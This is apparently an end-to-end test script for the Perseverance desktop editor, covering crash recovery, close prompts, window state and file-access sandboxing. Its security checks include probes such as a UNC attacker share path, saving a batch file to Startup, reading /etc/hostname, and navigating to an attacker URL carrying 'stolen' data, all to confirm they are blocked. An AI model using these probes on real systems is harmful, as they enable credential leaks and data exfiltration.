check('setZoomFactor zooms the page and the caption overlay follows', Math.abs(zoom.zoomed.dpr / zoom.before.dpr - 1.25) < 0.01 && zoom.reset === zoom.before.dpr && // env() is reported in whole CSS px: 39 DIP at 125% → 31.2 → 32 (an overlay stuck at 31 DIP would read 25).
  (zoom.before.overlay === 0 || (zoom.zoomed.overlay * 1.25 >= 38 && zoom.zoomed.overlay * 1.25 <= 41)), zoom);

/* ---- the page can't choose the Save dialog's folder (UNC probe / NTLM leak) or an executable type ---- */
const savesBeforeDlg = (await T_(app)).saves.length;
for (const p of [null, null, null, null, path.join(FILES, 'run.bat')]) await queueSave(app, p); // the 5th dialog "presses Enter" on run.bat
const dlgRes = await page.evaluate(
  async ({ poster, files }) => {
    const d = window.desktop;
    const PGFX = [{ name: 'Perseverance Project', extensions: ['pgfx'] }];
    const attempt = (o) =>
      d.saveFile({ title: 'Save As', data: '@echo off', ...o }).then(
        (r) => `dialog → ${r}`,
        (e) => `refused: ${String(e.message).replace(/^Error invoking remote method '[^']+': /, '').slice(0, 80)}`,
      );
    return {
      unc: await attempt({ defaultPath: '\\\\attacker\\share\\Poster.pgfx', filters: PGFX }),
      ungrantedFolder: await attempt({ defaultPath: `${files}/Startup/Poster.pgfx`, filters: PGFX }),
      granted: await attempt({ defaultPath: poster, filters: PGFX }),
      // A new name next to a file the user saved (a new document's Save As starts by the last project).
      trustedFolder: await attempt({ defaultPath: `${files}/New: Poster?.pgfx`, filters: PGFX }),
      mixedFilters: await attempt({ defaultPath: 'run.pgfx', filters: [{ name: 'P', extensions: ['pgfx', 'bat'] }, { name: 'Run', extensions: ['exe', 'lnk'] }] }),
      bat: await attempt({ defaultPath: 'Poster.bat', filters: [{ name: 'Startup', extensions: ['bat'] }] }),
      noFilters: await attempt({ defaultPath: 'Poster.hta' }),
      wildcard: await attempt({ defaultPath: 'Poster.lnk', filters: [{ name: 'All files', extensions: ['*'] }] }),
    };
  },
  { poster, files: FILES },
);
t = await T_(app);
const dlgSeen = t.saveOpts.slice(savesBeforeDlg).map((o) => ({ defaultPath: o.defaultPath ?? null, exts: (o.filters ?? []).flatMap((f) => f.extensions) }));
check(
  'Save dialog: page paths cut to a file name (granted files and their folders kept), only project/image/PSD types, none = refused',
  JSON.stringify(dlgSeen) ===
    JSON.stringify([
      { defaultPath: 'Poster.pgfx', exts: ['pgfx'] },
      { defaultPath: 'Poster.pgfx', exts: ['pgfx'] },
      { defaultPath: poster, exts: ['pgfx'] },
      { defaultPath: path.join(FILES, 'New_ Poster_.pgfx'), exts: ['pgfx'] },
      { defaultPath: 'run.pgfx', exts: ['pgfx'] },
    ]) &&
    ['bat', 'noFilters', 'wildcard'].every((k) => dlgRes[k].startsWith('refused')) &&
    dlgRes.mixedFilters === `dialog → ${path.join(FILES, 'run.bat.pgfx')}` &&
    !fs.existsSync(path.join(FILES, 'run.bat')) &&
    !fs.existsSync(path.join(FILES, 'Startup')),
  { dlgRes, dlgSeen },
);
fs.rmSync(path.join(FILES, 'run.bat.pgfx'), { force: true });

/* ---- large files ---- */
await queueSave(app, path.join(FILES, 'big.pgfx'));
const big = await page.evaluate(async () => {
  const d = window.desktop;
  const p = await d.saveFile({ title: 'big', defaultPath: 'big.pgfx', filters: [{ name: 'Perseverance Project', extensions: ['pgfx'] }], data: 'x' });
  const res = { path: p };
  for (const mb of [100, 300]) {
    const b = new Uint8Array(mb * 1024 * 1024);
    for (let i = 0; i < b.length; i += 4096) b[i] = (i >> 12) & 255;
    b[b.length - 1] = 77;
    let t = performance.now();
    await d.writeFile(p, b.buffer);
    res[`write${mb}MB`] = Math.round(performance.now() - t);
    t = performance.now();
    const r = new Uint8Array(await d.readFile(p));
    res[`read${mb}MB`] = Math.round(performance.now() - t);
    res[`ok${mb}`] = r.length === b.length && r[4096 * 5] === 5 && r[r.length - 1] === 77;
  }
  return res;
});
measurements.largeFiles = big;
check('300 MB write/read round trip', big.ok100 && big.ok300 && sizeOf(path.join(FILES, 'big.pgfx')) === 300 * 1024 * 1024, big);
fs.rmSync(path.join(FILES, 'big.pgfx'), { force: true });

/* ---- close guard: dirty document → prompt → Cancel keeps the window ---- */
await makeDirty(page);
await closeWindow(app);
let prompted = await answerPrompt(page, 'Save changes before closing?', 'Cancel');
await wait(500);
const diag = async () => ({
  ipc: (await T_(app)).ipc.slice(-6),
  boxes: (await T_(app)).boxes.slice(-3).map((b) => b.message),
  dialogs: await page.evaluate(() => window.__app.useUI.getState().dialogs.map((d) => d.props?.message ?? d.props?.title ?? '?')).catch((e) => e.message),
  sessions: await sessions(page).catch((e) => e.message),
});
check('close with unsaved changes asks; Cancel keeps the app open', prompted && (await windowCount(app)) === 1, prompted ? '' : await diag());

/* ---- close guard: busy renderer → "not responding" fallback, then the normal prompt ---- */
await page.evaluate(() =>
  setTimeout(() => {
    const t = Date.now();
    while (Date.now() - t < 4500);
  }, 30),
);
await wait(150);
const boxesBefore = (await T_(app)).boxes.length;
const tBusy = Date.now();
await closeWindow(app);
const fallback = await poll(async () => (await T_(app)).boxes.slice(boxesBefore).find((b) => b.message === 'Perseverance is not responding'), 6000);
measurements.closeFallbackMs = fallback ? fallback.at - tBusy : null;
prompted = await answerPrompt(page, 'Save changes before closing?', 'Cancel', 15000);
await wait(400);
check('busy renderer: force-quit offer after the ack timeout, renderer prompt once free', !!fallback && fallback.buttons.includes('Quit Anyway') && prompted && (await windowCount(app)) === 1, { fallbackAfterMs: measurements.closeFallbackMs, ...(fallback && prompted ? {} : await diag()) });

/* ---- unresponsive handler ---- */
await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].emit('unresponsive'));
await wait(300);
t = await T_(app);
const unresp = t.boxes.at(-1);
check('unresponsive window offers Wait / Reload / Quit', unresp && unresp.message === 'Perseverance is not responding' && unresp.buttons.join() === 'Wait,Reload,Quit', unresp);

const editorBack = () =>
  poll(() => main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('!!(window.__app && document.querySelector(".shell-root"))')), 20000, 300);
const hangRenderer = () => main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('setTimeout(() => { for (;;); }, 30); 1'));

/* ---- unresponsive → Reload: the hung process is killed and the editor really comes back ---- */
await hangRenderer();
await wait(300);
let boxesR = (await T_(app)).boxes.length;
await answerBox(app, 1); // "Reload"
const tReload = Date.now();
await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].emit('unresponsive'));
const backAfterReload = await editorBack();
measurements.unresponsiveReloadMs = Date.now() - tReload;
t = await T_(app);
check(
  'unresponsive → Reload brings the editor back (no blank window, no crash prompt)',
  !!backAfterReload && t.boxes.length === boxesR + 1 && !t.boxes.slice(boxesR).some((b) => /stopped unexpectedly/.test(b.message)),
  { back: !!backAfterReload, ms: measurements.unresponsiveReloadMs, boxes: t.boxes.slice(boxesR).map((b) => b.message) },
);

/* ---- …and when the reload never happens, the crash prompt still offers a way forward ---- */
await main(app, ({ BrowserWindow }) => {
  const wc = BrowserWindow.getAllWindows()[0].webContents;
  const orig = wc.reload;
  wc.reload = () => {
    wc.reload = orig; // swallow only the first reload (the one after the kill)
  };
});
await hangRenderer();
await wait(300);
boxesR = (await T_(app)).boxes.length;
await answerBox(app, 1); // "Reload" in the not-responding prompt (swallowed)
await answerBox(app, 0); // "Reload" in the safety-net crash prompt
await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].emit('unresponsive'));
const backAfterNet = await editorBack();
t = await T_(app);
check(
  'a reload that never finishes still ends in the crash prompt (Reload recovers)',
  !!backAfterNet && t.boxes.slice(boxesR).some((b) => /stopped unexpectedly/.test(b.message)),
  { back: !!backAfterNet, boxes: t.boxes.slice(boxesR).map((b) => b.message) },
);

/* ---- renderer crash → Reload ---- */
boxesR = (await T_(app)).boxes.length;
await answerBox(app, 0);
await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].webContents.forcefullyCrashRenderer());
const reloaded = await editorBack();
t = await T_(app);
check('renderer crash offers Reload and the editor comes back', !!reloaded && t.boxes.slice(boxesR).some((b) => b.message === 'The editor window stopped unexpectedly'), { reloaded });

/* ---- remember window bounds, then a hung renderer + close → "Quit Anyway" really quits ---- */
await main(app, ({ BrowserWindow }) => {
  const w = BrowserWindow.getAllWindows()[0];
  if (w.isMaximized()) w.unmaximize();
  w.setBounds({ x: 60, y: 40, width: 1280, height: 780 });
});
await wait(900);
const boundsA = await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].getBounds());
await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].webContents.executeJavaScript('setTimeout(() => { for (;;); }, 30); 1'));
await wait(200);
await answerBox(app, 1); // "Quit Anyway"
const tHung = Date.now();
await closeWindow(app).catch(() => {});
const code = await Promise.race([exited, wait(12000).then(() => 'timeout')]);
measurements.hungQuitMs = Date.now() - tHung;
check('hung renderer never traps the user (Quit Anyway exits)', code !== 'timeout', { exitCode: code, ms: measurements.hungQuitMs });
if (code === 'timeout') await app.close().catch(() => {});
const stateFile = path.join(userData, 'window-state.json');
const saved = fs.existsSync(stateFile) ? JSON.parse(fs.readFileSync(stateFile, 'utf8')) : null;
check('window state written to userData', !!saved && saved.width === boundsA.width && saved.height === boundsA.height, { saved, boundsA });
const consoleA = t.console;

/* ======================================================================== */
/* Phase B: relaunch with a file argument (cold start from Explorer)        */
/* ======================================================================== */
const cold = path.join(FILES, 'cold.pgfx');
fs.copyFileSync(poster, cold);
({ app, page, exited } = await launch([cold]));
await waitReady(page);
const coldDoc = await poll(async () => (await sessions(page)).find((s) => s.path === cold), 10000);
check('cold start with a .pgfx argument opens it', !!coldDoc, coldDoc);
const boundsB = await main(app, ({ BrowserWindow }) => {
  const w = BrowserWindow.getAllWindows()[0];
  return { ...w.getBounds(), maximized: w.isMaximized() };
});
check('window size/position restored', boundsB.width === boundsA.width && boundsB.height === boundsA.height && Math.abs(boundsB.x - boundsA.x) <= 2 && Math.abs(boundsB.y - boundsA.y) <= 40 && !boundsB.maximized, { boundsA, boundsB });

// Dismiss crash-recovery offers from phase A's forced quit (expected), then reload with the CSP probe.
await page.evaluate(() => window.__app.useUI.setState({ dialogs: [] }));
await installCspProbe(page);
await page.reload();
await waitReady(page);
await page.evaluate(() => window.__app.useUI.setState({ dialogs: [] }));

const recent = await page.evaluate(() => JSON.parse(localStorage.getItem('perseverance.recent') ?? '[]').map((e) => e.path));
const idx = recent.indexOf(poster);
check('recent files keep native paths', idx >= 0, recent);
if (idx >= 0) {
  await page.evaluate((i) => window.__app.commands.get(`file.openRecent.${i}`).run(), idx);
  const reopened = await poll(async () => (await sessions(page)).find((s) => s.path === poster), 8000);
  check('Open Recent works after a relaunch (persisted grants)', !!reopened, reopened);
  const w3 = await page.evaluate((p) => window.desktop.readFile(p).then((b) => window.desktop.writeFile(p, b)).then(() => 'ok', (e) => e.message), poster);
  check('a recent project can be saved in place after a relaunch', w3 === 'ok', w3);

  /* ---- File ▸ Open and Open Recent of the already-open project switch to it (never a second copy) ---- */
  const activateOther = () =>
    page.evaluate((p) => {
      const st = window.__app.useEditor.getState();
      const other = Object.values(st.sessions).find((s) => s.filePath !== p);
      if (other) st.setActiveDoc(other.doc.id);
      return !!other;
    }, poster);
  const activeIsPoster = () =>
    page.evaluate((p) => {
      const st = window.__app.useEditor.getState();
      return st.sessions[st.activeDocId]?.filePath === p;
    }, poster);
  if (!(await activateOther())) await openTemplate(page);
  await main(app, (_e, p) => globalThis.__t.openQueue.push(p), poster);
  await page.evaluate(() => window.__app.commands.get('file.open').run());
  await wait(500);
  const viaOpen = await activeIsPoster();
  await activateOther();
  const recentIdx = await page.evaluate((p) => JSON.parse(localStorage.getItem('perseverance.recent') ?? '[]').findIndex((e) => e.path === p), poster);
  await page.evaluate((i) => window.__app.commands.get(`file.openRecent.${i}`).run(), recentIdx);
  await wait(500);
  const viaRecent = await activeIsPoster();
  const posterCopies = (await sessions(page)).filter((s) => s.path === poster).length;
  check('File ▸ Open / Open Recent of an open project switch to its tab (no second copy)', viaOpen && viaRecent && posterCopies === 1, { viaOpen, viaRecent, posterCopies });
}
/* ---- Open Recent on a file the app may not read: explained, not reported as missing ---- */
const ungranted = path.join(FILES, 'ungranted.png');
fs.writeFileSync(ungranted, 'not chosen by the user');
const deniedRecent = await page.evaluate(async (p) => {
  const list = JSON.parse(localStorage.getItem('perseverance.recent') ?? '[]');
  localStorage.setItem('perseverance.recent', JSON.stringify([{ path: p, name: 'ungranted.png', time: Date.now() }, ...list]));
  window.dispatchEvent(new StorageEvent('storage', { key: 'perseverance.recent' })); // regenerates File ▸ Open Recent
  await window.__app.commands.get('file.openRecent.0').run();
  await new Promise((r) => setTimeout(r, 300));
  const text = document.body.innerText;
  return { explained: text.includes("can't be reopened directly"), notFound: /could not be found/.test(text), stillListed: JSON.parse(localStorage.getItem('perseverance.recent')).some((e) => e.path === p) };
}, ungranted);
check('Open Recent without access says so (not "could not be found") and drops the entry', deniedRecent.explained && !deniedRecent.notFound && !deniedRecent.stillListed, deniedRecent);

const grantsFile = path.join(userData, 'file-access.json');
const grants = fs.existsSync(grantsFile) ? JSON.parse(fs.readFileSync(grantsFile, 'utf8')).files : [];
check('grants persisted in userData (projects writable, nothing else)', grants.some((g) => g.path === poster && g.write) && !grants.some((g) => g.path === evil || g.path === legacy), grants.map((g) => `${path.basename(g.path)}:${g.write ? 'rw' : 'r'}`));

/* ---- broad coverage under the real CSP ---- */
const cov = await page.evaluate(async (fullRun) => {
  const a = window.__app;
  const errs = [];
  const tpls = a.templates.list().map((x) => x.id);
  for (const id of fullRun ? tpls : tpls.slice(0, 4)) {
    const doc = await a.templates.get(id).build();
    a.useEditor.getState().openDocument(doc, { label: 'Template' });
    await new Promise((r) => setTimeout(r, fullRun ? 900 : 1500));
  }
  for (const p of a.panels.list()) {
    a.useUI.getState().showPanel(p.id);
    await new Promise((r) => setTimeout(r, 120));
  }
  return { templates: fullRun ? tpls.length : 4, panels: a.panels.list().length, errs };
}, full);
if (full) {
  const DENY = /^(file\.(open|place|exit|close|closeAll|openRecent|save|saveAs|export|quickExportPng|exportPsd|importModel|fetchAvatar)|help\.openDataFolder|view\.fullscreen|roblox\.(importModel|fetchAvatar)|edit\.(copy|cut|paste|pasteInPlace|copyMerged))/;
  const vp = await page.evaluate(() => {
    const r = (document.querySelector('[data-viewport]') ?? document.querySelector('canvas'))?.getBoundingClientRect();
    return r ? { x: r.left, y: r.top, w: r.width, h: r.height } : null;
  });
  let tools = 0;
  for (const id of await page.evaluate(() => window.__app.tools.list().map((x) => x.id))) {
    if (['hand', 'zoom'].includes(id) || !vp) continue;
    await page.evaluate((tid) => window.__app.useEditor.getState().setTool(tid), id);
    const cx = vp.x + vp.w * 0.45;
    const cy = vp.y + vp.h * 0.45;
    await page.mouse.move(cx, cy);
    await page.mouse.down();
    for (let k = 1; k <= 6; k++) await page.mouse.move(cx + k * 12, cy + k * 7);
    await page.mouse.up();
    await page.keyboard.press('Escape');
    tools++;
  }
  let ran = 0;
  for (const id of await page.evaluate(() => window.__app.commands.list().map((c) => c.id))) {
    if (DENY.test(id)) continue;
    await page
      .evaluate(async (cid) => {
        const c = window.__app.commands.get(cid);
        if (c.enabled && !c.enabled()) return;
        await Promise.race([Promise.resolve(c.run()), new Promise((r) => setTimeout(r, 1500))]);
      }, id)
      .catch(() => {});
    ran++;
    await page.evaluate(() => {
      window.__app.useUI.setState({ dialogs: [], commandPaletteOpen: false });
      if (!window.__app.useEditor.getState().activeDocId) window.__app.openDemoDocument();
    });
  }
  cov.tools = tools;
  cov.commands = ran;
}
await wait(1500);
await page.screenshot({ path: out });
check('coverage run inside Electron', cov.panels > 5, cov);

const csp = await page.evaluate(() => window.__csp);
t = await T_(app);
const consoleAll = [...consoleA, ...t.console];
// The file:// probes above fail on purpose (net::ERR_BLOCKED_BY_CLIENT): not app errors.
const errors = consoleAll.filter((m) => m.level === 'error' && !PROBE_RE.test(`${m.message} ${m.source}`) && !workerProbeConsole.has(m.message));
const secWarnings = consoleAll.filter((m) => /Electron Security Warning/i.test(m.message));
const cspConsole = consoleAll.filter((m) => /Content Security Policy|Refused to/i.test(m.message) && !workerProbeConsole.has(m.message));
check('no CSP violations', csp.length === 0 && cspConsole.length === 0, [...csp, ...cspConsole.map((m) => m.message)].slice(0, 8));
check('no Electron security warnings', secWarnings.length === 0, secWarnings.map((m) => m.message.slice(0, 120)));
check('no renderer console errors', errors.length === 0, errors.map((m) => `${m.message.slice(0, 160)} (${m.source}:)`).slice(0, 10));

/* ---- navigation is blocked (done last: a blocked navigation confuses Playwright's frame tracking) ---- */
await page.evaluate(() => {
  location.href = 'file:///etc/hostname';
});
await wait(600);
const externalBeforeNav = (await T_(app)).external.length;
await page.evaluate(() => {
  location.href = 'https://attacker.example/nav?d=stolen';
});
await wait(800);
await page.evaluate(() => {
  location.href = 'https://www.roblox.com/users/1/profile';
});
await wait(800);
t = await T_(app);
const href = await page.evaluate(() => location.href);
check(
  'the window never navigates away, and a navigation is never handed to the browser',
  /dist\/index\.html$/.test(href) && t.external.length === externalBeforeNav && (await page.evaluate(() => !!window.__app)),
  { href, external: t.external.slice(externalBeforeNav) },
);

/* ---- close again while the in-app prompt is open: a native way out after a moment ---- */
await makeDirty(page);
let boxesN = (await T_(app)).boxes.length;
await closeWindow(app);
const inApp = await poll(() => page.evaluate(() => document.body.innerText.includes('Save changes before closing?')), 6000);
await closeWindow(app); // quick second click: just keeps the prompt
await wait(300);
const quickBoxes = (await T_(app)).boxes.length - boxesN;
await wait(1600);
await answerBox(app, 0); // "Wait"
await closeWindow(app);
const stuckBox = await poll(async () => (await T_(app)).boxes.slice(boxesN).find((b) => /Quit without answering/.test(b.message)), 4000);
await wait(300);
check(
  'closing again while the unsaved-changes prompt is open offers Quit Anyway (Wait keeps it)',
  inApp && quickBoxes === 0 && !!stuckBox && stuckBox.buttons.join() === 'Wait,Quit Anyway' && (await windowCount(app)) === 1 && (await page.evaluate(() => document.body.innerText.includes('Save changes before closing?'))),
  { inApp, quickBoxes, stuckBox },
);

/* ---- normal quit: dirty → Discard (answering the prompt that is still open) ---- */
prompted = await answerPrompt(page, 'Save changes before closing?', 'Discard');
const codeB = await Promise.race([exited, wait(10000).then(() => 'timeout')]);
check('quit with unsaved changes → Discard exits', prompted && codeB !== 'timeout', { exitCode: codeB });
if (codeB === 'timeout') await app.close().catch(() => {});

/* ======================================================================== */
/* Phase C: Windows log off / shut down never blocks on the close guard     */
/* ======================================================================== */
({ app, page, exited } = await launch());
await waitReady(page);
await page.evaluate(() => window.__app.useUI.setState({ dialogs: [] }));
await openTemplate(page);
await makeDirty(page);
await wait(300);
await main(app, ({ BrowserWindow }) => {
  const w = BrowserWindow.getAllWindows()[0];
  w.emit('session-end');
  w.close();
});
const codeC = await Promise.race([exited, wait(8000).then(() => 'timeout')]);
check('Windows session end closes without the unsaved-changes prompt', codeC !== 'timeout', { exitCode: codeC });
if (codeC === 'timeout') await app.close().catch(() => {});

const logFile = path.join(userData, 'logs', 'main.log');
const mainLog = fs.existsSync(logFile) ? fs.readFileSync(logFile, 'utf8') : '';
check('main-process log written (crash + warnings recorded)', /render process gone/.test(mainLog) && /close request not acknowledged/.test(mainLog), logFile);
check('blocked file:// requests are logged', /blocked file request file:\/\/\/etc\/hostname/.test(mainLog), logFile);
check('refused links and navigations are logged', /blocked external url https:\/\/attacker\.example/.test(mainLog) && /blocked navigation https:\/\/attacker\.example/.test(mainLog), logFile);

/* ======================================================================== */
/* Phase D: installed in a folder with URL-special characters                */
/* ======================================================================== */
// Windows profile names may contain '%' (per-user installs and the portable exe's %TEMP% live under the
// profile folder), and the NSIS installer lets users pick any folder. Electron's loadFile() left '%'
// unescaped, so the file:// filter refused the app's own index.html (blank window, IPC refused).
const instDir = path.join(T, 'inst', '100% Art #1 ?q Ünï 25%ad x%41y', 'Perseverance');
fs.mkdirSync(instDir, { recursive: true });
for (const part of ['electron', 'dist', 'build', 'package.json']) {
  const from = path.join(appDir, part);
  if (!fs.existsSync(from)) continue;
  try {
    execFileSync('cp', ['-al', from, instDir]); // hard links: fast, same bytes
  } catch {
    fs.cpSync(from, path.join(instDir, part), { recursive: true });
  }
}
const CFG_D = path.join(T, 'cfg-d');
fs.mkdirSync(CFG_D, { recursive: true });
({ app, page, exited } = await launch([], { dir: instDir, launchEnv: { ...env, XDG_CONFIG_HOME: CFG_D } }));
const loadedD = await page
  .waitForFunction(() => !!window.__app && !!document.querySelector('.shell-root'), null, { timeout: 30000 })
  .then(() => true, () => false);
const pctInfo = await page.evaluate(async () => {
  const r = { href: location.href };
  try {
    r.userData = await window.desktop.userDataPath(); // IPC is only answered for the trusted app page
  } catch (e) {
    r.userData = `ERR ${e.message}`;
  }
  const tryFetch = (u) => fetch(u).then((x) => `ALLOWED ${x.status}`, (e) => `blocked ${e.name}`);
  r.ownBundle = await tryFetch(new URL('./favicon.png', location.href).href);
  r.systemFile = await tryFetch('file:///etc/hostname');
  r.outside = await tryFetch(new URL('../package.json', location.href).href);
  return r;
}).catch((e) => ({ err: e.message }));
let hrefPathD = null;
try {
  hrefPathD = fileURLToPath(pctInfo.href);
} catch {
  /* not a file URL (chrome-error://…) */
}
check(
  'installed under "100% Art #1 ?q Ünï 25%ad x%41y": the editor loads, IPC is trusted, the bundle filter still holds',
  loadedD && hrefPathD === path.join(instDir, 'dist', 'index.html') && /%25/.test(pctInfo.href) && !String(pctInfo.userData).startsWith('ERR') && pctInfo.ownBundle === 'ALLOWED 200' && pctInfo.systemFile.startsWith('blocked') && pctInfo.outside.startsWith('blocked'),
  { loadedD, ...pctInfo },
);
if (loadedD) await openTemplate(page); // lazy chunks + fonts load from the same folder
const userDataD = path.join(CFG_D, 'Perseverance');
const logD = () => (fs.existsSync(path.join(userDataD, 'logs', 'main.log')) ? fs.readFileSync(path.join(userDataD, 'logs', 'main.log'), 'utf8') : '');
const ownBlocked = logD()
  .split('\n')
  .filter((l) => /blocked file request/.test(l) && l.includes('/inst/') && !/package\.json/.test(l));
check('no request for the app\'s own files was blocked there (lazy chunks, fonts, images)', loadedD && ownBlocked.length === 0 && !/did-fail-load/.test(logD()), ownBlocked.slice(0, 3));

/* ---- a page that fails to load says so (no silent blank window) and "Try Again" brings it back ---- */
const boxesD = (await T_(app)).boxes.length;
await answerBox(app, 0); // "Try Again"
await main(app, ({ BrowserWindow }, url) => void BrowserWindow.getAllWindows()[0].webContents.loadURL(url).catch(() => {}), pathToFileURL(path.join(instDir, 'dist', 'missing.html')).href);
const failBox = await poll(async () => (await T_(app)).boxes.slice(boxesD).find((b) => /could not be loaded/.test(b.message)), 8000);
const backD = await poll(() => page.evaluate(() => !!(window.__app && document.querySelector('.shell-root')) && location.href.endsWith('/index.html')).catch(() => false), 20000, 300);
check('a failed page load shows an error naming the log (Try Again / Quit), and Try Again reloads the editor', !!failBox && failBox.buttons.join() === 'Try Again,Quit' && !!backD, { failBox, backD });

await page.evaluate(() => window.__app.useUI.setState({ dialogs: [] })).catch(() => {});
const tCloseD = Date.now();
await closeWindow(app).catch(() => {});
const codeD = await Promise.race([exited, wait(8000).then(() => 'timeout')]);
check('the window closes at once there (close-ack accepted from the page)', codeD !== 'timeout' && Date.now() - tCloseD < 4000, { exitCode: codeD, ms: Date.now() - tCloseD });
if (codeD === 'timeout') await app.close().catch(() => {});

/* ======================================================================== */
/* Phase E: the bundle is missing at start / vanishes while the app runs    */
/* ======================================================================== */
// Antivirus quarantine, a reinstall or uninstall while the app is open, a cleaned %TEMP% under the portable
// exe. Every failed load of the editor must say so (Try Again / Quit), also the reload after a crash or a
// hang (it used to be skipped: a silent blank window), and Chromium's error page that follows a failed load
// is not the editor: files handed over meanwhile wait for "Try Again" (they used to be sent to the error page
// and lost), and the hung-renderer safety net doesn't stack a crash prompt on top.
const instE = path.join(T, 'inst-e', '100% Art #1 ?q Ünï 25%ad x%41y', 'Perseverance');
fs.mkdirSync(instE, { recursive: true });
for (const part of ['electron', 'dist', 'build']) {
  const from = path.join(appDir, part);
  if (!fs.existsSync(from)) continue;
  try {
    execFileSync('cp', ['-al', from, instE]); // fresh folders with hard-linked files: renames here stay here
  } catch {
    fs.cpSync(from, path.join(instE, part), { recursive: true });
  }
}
// Entry module: the same test doubles as launch(), boxes held open, installed BEFORE main.cjs creates the
// window (the very first load fails at once, before the check could install anything from outside).
const pkgE = JSON.parse(fs.readFileSync(path.join(appDir, 'package.json'), 'utf8'));
pkgE.main = 'check-entry.cjs';
fs.writeFileSync(path.join(instE, 'package.json'), JSON.stringify(pkgE, null, 2));
fs.writeFileSync(path.join(instE, 'check-entry.cjs'), `(${installMainDoubles})(require('electron'), { hold: true });\nrequire('./electron/main.cjs');\n`);
const indexE = path.join(instE, 'dist', 'index.html');
const hideBundle = () => fs.renameSync(indexE, `${indexE}.gone`);
const restoreBundle = () => fs.renameSync(`${indexE}.gone`, indexE);
const CFG_E = path.join(T, 'cfg-e');
fs.mkdirSync(CFG_E, { recursive: true });
const coldMissing = path.join(FILES, 'Cold While Missing.pgfx');
const whileDown = path.join(FILES, 'While Down.pgfx');
fs.copyFileSync(poster, coldMissing);
fs.copyFileSync(poster, whileDown);

hideBundle();
app = await electron.launch({ executablePath: electronPath, args: [instE, '--no-sandbox', coldMissing], env: { ...env, XDG_CONFIG_HOME: CFG_E }, cwd: T });
exited = new Promise((r) => app.process().once('exit', (code) => r(code)));
await app.firstWindow();
/** Run in the editor page through the main process (a Playwright page does not survive a renderer crash). */
const inPageE = (js) => main(app, ({ BrowserWindow }, js) => BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(js), js).catch(() => undefined);
const editorUpE = () => inPageE('!!(window.__app && document.querySelector(".shell-root")) && location.href.endsWith("/index.html")');
const hasDocE = (p) => inPageE(`Object.values(window.__app.useEditor.getState().sessions).some((s) => s.filePath === ${JSON.stringify(p)})`);
const boxesE = async (from = 0) => (await T_(app)).boxes.slice(from);
const findBox = (from, re) => poll(async () => (await boxesE(from)).find((b) => re.test(b.message)), 10000);

/* ---- cold start with the bundle missing and a file argument (Explorer double-click) ---- */
const coldFail = await findBox(0, /could not be loaded/);
await wait(1500); // the error page's 'did-finish-load' has come and gone
const coldUpBefore = !!(await editorUpE());
restoreBundle();
await release(app, 0); // "Try Again"
const coldBack = await poll(editorUpE, 20000, 300);
const coldOpened = await poll(() => hasDocE(coldMissing), 10000, 300);
check(
  'missing bundle at start: the error says so (Try Again / Quit), and Try Again opens the editor with the file handed over at launch',
  !!coldFail && coldFail.buttons.join() === 'Try Again,Quit' && coldFail.visible && !coldUpBefore && !!coldBack && !!coldOpened,
  { coldFail, coldBack: !!coldBack, coldOpened: !!coldOpened },
);
await inPageE('window.__app.useUI.setState({ dialogs: [] }), 1');

/* ---- crash → Reload while the bundle is gone; a file handed over while the editor is down ---- */
let nE = (await boxesE()).length;
hideBundle();
await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].webContents.forcefullyCrashRenderer());
const crashE = await findBox(nE, /stopped unexpectedly/);
await main(
  app,
  ({ app: eApp }, { file, cwd, exe, root }) => eApp.emit('second-instance', {}, [exe, root, file], cwd, { argv: [exe, root, file], cwd }),
  { file: whileDown, cwd: T, exe: electronPath, root: instE },
);
await release(app, 0); // "Reload" in the crash prompt: the reload fails
const crashFail = await findBox(nE, /could not be loaded/);
await wait(1500);
restoreBundle();
await release(app, 0); // "Try Again"
const crashBack = await poll(editorUpE, 20000, 300);
const downOpened = await poll(() => hasDocE(whileDown), 10000, 300);
check(
  'a reload after a crash that fails (bundle gone) says so, and Try Again brings the editor back',
  !!crashE && !!crashFail && crashFail.buttons.join() === 'Try Again,Quit' && crashFail.visible && !!crashBack,
  { crash: !!crashE, crashFail, back: !!crashBack, boxes: (await boxesE(nE)).map((b) => b.message) },
);
check('a file handed over while the editor was down waits through the failed reload and opens after Try Again', !!downOpened, { downOpened: !!downOpened });
await inPageE('window.__app.useUI.setState({ dialogs: [] }), 1');

/* ---- unresponsive → Reload while the bundle is gone: the error, no crash prompt on top, Quit exits ---- */
nE = (await boxesE()).length;
hideBundle();
await main(app, ({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].emit('unresponsive'));
const hangE = await findBox(nE, /not responding/);
await release(app, 1); // "Reload": the renderer is killed and the reload fails
const hangFail = await findBox(nE, /could not be loaded/);
await wait(Number(env.PERSEVERANCE_RELOAD_TIMEOUT_MS) + 1500); // past the "did not restart" safety net
const afterHang = await boxesE(nE);
check(
  'a reload of a hung renderer that fails says so, and the restart safety net adds no crash prompt on top',
  !!hangE && !!hangFail && !hangFail.dismissed && hangFail.answered === undefined && !afterHang.some((b) => /stopped unexpectedly/.test(b.message)),
  { boxes: afterHang.map((b) => `${b.message}${b.dismissed ? ' (dismissed)' : ''}`) },
);
const tQuitE = Date.now();
await release(app, 1); // "Quit"
const codeE = await Promise.race([exited, wait(8000).then(() => 'timeout')]);
check('Quit in the load error exits the app', codeE !== 'timeout', { exitCode: codeE, ms: Date.now() - tQuitE });
if (codeE === 'timeout') await app.close().catch(() => {});
if (fs.existsSync(`${indexE}.gone`)) restoreBundle();
const logE = path.join(CFG_E, 'Perseverance', 'logs', 'main.log');
check('failed loads are logged', fs.existsSync(logE) && (fs.readFileSync(logE, 'utf8').match(/did-fail-load/g) ?? []).length >= 3, logE);

finish();
